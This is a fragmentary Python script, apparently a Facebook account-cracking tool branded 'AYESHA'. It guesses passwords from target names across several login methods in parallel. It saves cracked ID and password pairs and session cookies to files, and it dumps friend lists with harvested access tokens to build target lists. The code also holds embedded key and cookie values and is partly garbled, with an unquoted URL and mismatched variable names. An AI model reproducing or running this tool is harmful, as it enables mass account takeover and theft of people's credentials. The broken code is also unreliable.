...
\033[1;33m------------------------------------------------
\033[1;35m Owner   :            Ayesha Sana
\033[1;35m Facebook:           Ayesha Sana
\033[1;35m Tool Type  :            Parsnal
\033[1;35m Version :            0.0.1
\033[1;33m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back AYESHA Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AYESHA] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    # 'cookie': 'datr=JgFAZB0-Pwj3TjgQSxM3nvI5; sb=JgFAZDx6RDk8POcPZBtMuT3u',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
                ...
                q = session.post('https://mbasic.facebook.com/', cookies=cookies, headers=headers).json()
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [AYESHA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AYESHA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/JOKER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [AYESHA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AYESHA_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AYESHA] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[AYESHA] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[AYESHA] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [AYESHA-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/AYESHA_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazAYESHA(max_workers=30) as JOKERworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                AYESHAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                AYESHAworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                AYESHAworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                AYESHAworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def cutter():
    ...
    AYESHA = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+AYESHA+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/AYESHA.txt\n') 
        filepath = input("Put File Name: ")
        ...
        for rept in range(srange):
            ...
            if  sid=='stop':
                ...
                ys.close()
            try:
                dmp = requests.get(https://github.com/Ayeshu7864/trick.txt/blob/main/trick.txt+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
...
def cutter():
    ...
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + AYESHA )
    print("New File Saved:" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back AYESHA Menu ")
    AYESHA(allkey)       
